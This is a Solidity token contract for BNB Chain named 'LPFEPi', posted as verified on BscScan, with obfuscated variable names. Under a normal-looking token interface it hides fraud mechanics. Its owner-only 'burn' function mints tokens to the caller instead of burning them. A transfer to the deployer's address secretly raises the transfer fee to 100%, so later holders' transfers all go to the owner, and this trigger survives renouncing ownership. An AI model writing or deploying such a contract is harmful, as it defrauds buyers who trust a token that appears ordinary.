/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.11;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

contract LPFEPi {
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  UprAti = 10000000000000;
uint256 public  VbCeuj = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  pkdLsB = address(0);
uint256 public  AREMBi = 1000000000000000000;
address public  eUTdKS = address(0);
uint8 public constant decimals = 18;
address public owner;
address private  UsegMz = address(0);
mapping (address => uint256) public balanceOf;
address public  trtxQZ = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  HQzfbG = address(0);
uint256 public  eqqTgd = 10000000000000000000;
uint256 public  yDyGEC = 100000000000000000;
address public  GMlTlD = address(0);
address public  DTHbMs = address(0);
uint256 public constant HbTIge = 9+1;
string public  name = "LPFEPi";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  KBjQfE = 100000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  buBsmF = 10000000000000000;
uint256 public  dTeBRQ = 100000000000000000000000;
string public  symbol = "LPFEPi";
uint256 public  hubHDW = 10000000000000000000000000000;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
UsegMz = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "glBWSm");
require(to != address(0), "glBWSm");
require(amount <= balanceOf[from], "glBWSm");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HbTIge/UprAti ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==UsegMz){
UprAti = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}